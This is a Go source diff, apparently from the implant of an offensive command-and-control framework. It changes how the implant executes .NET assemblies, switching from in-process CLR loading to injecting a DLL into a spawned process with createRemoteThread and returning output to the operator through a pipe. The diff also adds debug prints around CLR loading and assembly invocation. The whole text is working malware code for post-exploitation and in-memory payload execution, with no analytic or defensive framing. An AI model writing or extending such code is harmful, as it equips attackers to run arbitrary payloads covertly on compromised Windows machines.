@@ -58,11 +58,10 @@ func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
 	if string(description) != ".NET assembly" {
 		return execAsmInject(b, isDllX64, ignoreToken)
 	}
-	//return execAsmInject(b, isDllX64, ignoreToken)
-	return execAsmGo(b)
+	return execAsmInject(b, isDllX64, ignoreToken)
+	//return execAsmGo(b)
 }
 
-// TODO deal with raw reflective dll
 func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
 	// callBackType, sleepTime, offset, description, args(csharp asm), dll, err
 	callBackType, sleepTime, offset, _, args, dll, err := parseExecAsm(b)
@@ -102,10 +101,12 @@ func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
 			return err
 		}
 
-		err = createRemoteThread(procInfo.Process, dll, offset, args)
+		hThread, err := createRemoteThread(procInfo.Process, offset, dll, args)
 		if err != nil {
 			return err
 		}
+		// close it manually
+		_ = windows.CloseHandle(windows.Handle(hThread))
 		return loopRead(procInfo.Process, rPipe, int(sleepTime), int(callBackType), nil)
 	}
 	return nil
@@ -127,14 +128,17 @@ func execAsmGo(b []byte) error {
 		return errors.New(util.Sprintf("RedirectStdoutStderr error: %s", err))
 	}
 	runtimeHost, err := clr.LoadCLR("v4")
+	util.Println("after loadCLR")
 	if err != nil {
 		return errors.New(util.Sprintf("LoadCLR error: %s", err))
 	}
 	methodInfo, err := clr.LoadAssembly(runtimeHost, csharpBin)
+	util.Println("after LoadAssembly")
 	if err != nil {
 		return errors.New(util.Sprintf("LoadAssembly error: %s", err))
 	}
 	stdout, stderr := clr.InvokeAssembly(methodInfo, argsArr)
+	util.Println("after InvokeAssembly")
 	if stdout != "" {
 		packet.PushResult(int(callBackType), []byte(stdout))
 	}
